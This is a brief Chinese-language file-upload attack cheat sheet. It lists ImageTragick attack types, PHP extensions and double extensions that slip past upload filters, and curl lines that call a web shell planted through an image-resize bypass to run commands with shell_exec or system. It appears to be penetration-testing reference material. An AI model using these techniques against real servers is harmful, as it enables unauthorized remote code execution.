# 上传
如果不正确处理，上传的文件可能会带来很大的风险。远程攻击者可以使用特定的文件名或mime类型发送多部件/表单数据POST请求，并执行任意代码。

## 开发
图像的悲剧（Image Tragik）
```
HTTP Request
Reverse Shell
Touch command
```

PHP扩展
```
.php

Less known extension
.pht
.pgif
.phtml
.shtml

Double extension
.jpeg.php
.png.php
```

绕开PNG调整大小 - 上传图片并使用本地文件
```
You can use it by specifying $_GET[0] as shell_exec and passing a $_POST[1] parameter with the shell command to execute.
curl 'http://localhost/b.php?0=shell_exec' --data "1='ls'"
curl 'http://localhost/test.php?0=system' --data "1='ls'"
```

绕开JPG调整大小 - 上传图片并使用本地文件包
```
http://localhost/test.php?c=ls
```

## 致谢
* Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil
